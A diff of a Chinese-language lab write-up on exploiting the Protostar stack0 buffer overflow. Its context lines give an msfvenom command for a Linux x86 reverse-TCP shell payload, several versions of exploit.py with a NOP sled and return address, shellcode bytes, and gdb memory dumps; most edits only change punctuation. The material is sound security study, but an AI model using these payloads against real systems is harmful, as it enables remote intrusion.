-开始一直是通过ssh user@192.168.2.144到protostar系统进行远程操作的，后来发现ssh登录时和直接在protostar系统中操作时不同，这两种情况下运行:
+这样/tmp/stack0就是user用户的文件了,溢出时可以正常产生core文件,但是没有原来/opt/protostar/bin/stack0的suid=root属性
+开始一直是通过ssh user@192.168.2.144到protostar系统进行远程操作的,后来发现ssh登录时和直接在protostar系统中操作时不同,这两种情况下运行:
 python exploit.py
 在内存中分配的地址不同
 
@@ -981,7 +981,7 @@ ssh user@192.168.2.144时shellcode的内存地址为0xbffff790
 重新由下面语句生成shellcode,由原来的x64改成x86,LPORT改成2222(kali为64位系统,protostar为32位系统)
 
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=2222 -b "\x00" -f py
-exploit.py代码如下：
+exploit.py代码如下:
 -------------------exploit.py-----------------------
 #/usr/bin/python
 import os
@@ -1004,7 +1004,7 @@ print input
 os.system("echo '%s' | ./stack0" % input)
 -----------------end--------------------------------
 
-发现还是无法反弹shell,于是在shellcode前加一串nop试试，发现加9个以上的nop（\x90)可以成功反弹shell
+发现还是无法反弹shell,于是在shellcode前加一串nop试试,发现加9个以上的nop(\x90)可以成功反弹shell
 加上nop后代码如下:
 ----------------------exploit.py--------------------------
 #/usr/bin/python
@@ -1028,12 +1028,12 @@ print input
 os.system("echo '%s' | ./stack0" % input)
 ------------------------end-------------------------------
 
-而经检验并不是shellcode在内存中的位置(0x0xbffff880)定位不准的问题,应该是由于以下原因造成：
+而经检验并不是shellcode在内存中的位置(0x0xbffff880)定位不准的问题,应该是由于以下原因造成:
 
-上面msfvenom生成shellcode时，由于加了-b "\x00"参数，msfvenom默认用x86/shikata_ga_nai编码器编码，解码过程需要shellcode前面有一些空间（这里是9个字节大小的空间）用来帮助完成shellcode的解码过程
-shellcode前面加上9个以上的nop后shellcode顺利的完成了解码，反弹了shell（本地事先用相同的payload+multi/handler监听,如果用nc -lvp 2222来监听不能建立shell的连接,用nc -lvp只能看到connect，然后就断了）
-但是由于protostar系统是个liveCD系统，反弹的shell连上以后马上会断,应该是由于"光盘"特殊的原因
-这样看来，并不是msf产生的shellcode就是毋庸置疑完全可靠的，前面竟要9个以上的空间才可支持其解码后顺利运行
+上面msfvenom生成shellcode时,由于加了-b "\x00"参数,msfvenom默认用x86/shikata_ga_nai编码器编码,解码过程需要shellcode前面有一些空间(这里是9个字节大小的空间)用来帮助完成shellcode的解码过程
+shellcode前面加上9个以上的nop后shellcode顺利的完成了解码,反弹了shell(本地事先用相同的payload+multi/handler监听,如果用nc -lvp 2222来监听不能建立shell的连接,用nc -lvp只能看到connect,然后就断了)
+但是由于protostar系统是个liveCD系统,反弹的shell连上以后马上会断,应该是由于"光盘"特殊的原因
+这样看来,并不是msf产生的shellcode就是毋庸置疑完全可靠的,前面竟要9个以上的空间才可支持其解码后顺利运行
 
 用同样的方法在kali上尝试溢出反弹shell,将protostar系统中的stack0复制到kali上
 scp user@192.168.3.105:/opt/protostar/bin/stack0 /root/桌面
@@ -1061,7 +1061,7 @@ buf += "\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f"
 buf += "\xbe\x05"
 --------------------------end----------------------------
 
-此时exploit.py如下：
+此时exploit.py如下:
 
 ---------------------exploit.py------------------------
 #/usr/bin/python
@@ -1087,7 +1087,7 @@ print input
 os.system("echo '%s' | ./stack0" % input)
 -----------------------end-----------------------------
 
-尝试通过shellcode前面加上标志"bbbb"找出shellcode在内存中的固定地址，其中上面jmp_esp的值为随意填写的一个
+尝试通过shellcode前面加上标志"bbbb"找出shellcode在内存中的固定地址,其中上面jmp_esp的值为随意填写的一个
 
 python exploit.py
 --------------output:-----------------
@@ -1112,7 +1112,7 @@ x/10x $esp
 0xffd26190:     0xffffef05      0x53bb48ff      0xa29ca7dd      0x4805be89
 0xffd261a0:     0x2d485831      0xfffffff8
 -----------end--------------
-由此看出shellcode在内存的地址应该写成0xffd26180,也即jmp_esp="\x80\x61\xd2\xff",并将"bbbb"换成"\x90"*9,修改exploit.py如下：
+由此看出shellcode在内存的地址应该写成0xffd26180,也即jmp_esp="\x80\x61\xd2\xff",并将"bbbb"换成"\x90"*9,修改exploit.py如下:
 --------------------exploit.py-------------------
 #/usr/bin/python
 import os
@@ -1137,7 +1137,7 @@ print input
 os.system("echo '%s' | ./stack0" % input)
 ----------------------end------------------------
 
-重新运行：
+重新运行:
 python exploit.py
 ----------------output:-------------------
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�a���������H1����H���H�Sݧ����H1X'H-����9ȋR���W����'������
@@ -1164,7 +1164,7 @@ x/10x $esp
 0xffa14180:     0x05be89a2      0x48583148
 -------------end--------------
 
-从中发现这时shellcode的内存地址又变成了0xffa14160(上面[esp]后紧接的9个90证明了这点),不再是0xffd26180,可以看出kali的内存中没有固定的shellcode地址,每次shellcode地址都会变化，这应该是由于kali的内核版本高，安全性好造成的
+从中发现这时shellcode的内存地址又变成了0xffa14160(上面[esp]后紧接的9个90证明了这点),不再是0xffd26180,可以看出kali的内存中没有固定的shellcode地址,每次shellcode地址都会变化,这应该是由于kali的内核版本高,安全性好造成的
 
 </code></pre>
 </div>
